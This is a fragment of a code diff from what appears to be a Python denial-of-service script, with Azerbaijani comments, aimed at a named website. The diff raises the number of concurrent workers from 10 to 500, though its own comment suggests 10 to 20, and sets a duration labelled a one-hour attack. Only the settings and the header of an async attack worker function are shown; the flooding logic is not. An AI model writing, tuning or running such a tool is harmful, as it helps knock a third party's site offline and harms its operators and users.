@@ -6,7 +6,7 @@ import time
 
 # --- AYARLAR ---
 TARGET_URL = "https://streamwin.win"
-WORKERS = 10  # Railway güclüdür, 10-20 arası edə bilərsən
+WORKERS = 500  # Railway güclüdür, 10-20 arası edə bilərsən
 DURATION = 3600 # 1 SAATLIQ HÜCUM
 
 async def attack_worker(worker_id):
